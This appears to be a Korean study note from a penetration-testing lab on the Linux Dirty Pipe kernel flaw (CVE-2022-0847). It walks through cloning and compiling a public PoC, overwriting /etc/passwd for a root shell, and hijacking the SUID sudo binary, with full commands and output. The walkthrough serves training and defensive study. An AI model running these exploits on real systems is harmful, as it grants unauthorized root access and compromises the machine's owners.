리눅스 커널 취약점인 Dirty Pipe(CVE_2022-0847) 취약점은 리눅스에서 루트 사용자 파일에 대한 무단 쓰기를 허용한다. 취약한 대상은 아래 버전의 모든 커널이다.
- **5.8~5.17**

익스플로잇을 위해서 PoC를 다운로드하여 대상 시스템 자체 또는 우리가 만든 사본에서 컴파일 해야한다.
```powershell
cry0l1t3@nix02:~$ git clone <https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git>
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

→ 컴파일 이후 두 가지 익스플로잇을 실행할 수 있다.

**exploit-1** 은 /etc/passwd 를 수정하고 루트 권한이 있는 프롬프트를 표시한다

**커널 버전 확인**
```powershell
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

**Exploit**
```powershell
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

**exploit-2**는 SUID 바이너리를 root 권한으로 실행할 수 있다. 따라서, SUID 가 설정된 바이너리부터 찾아야 한다.

**SUID 탐색**
```powershell
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

**sudo 바이너리로 익스플로잇**
```powershell
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```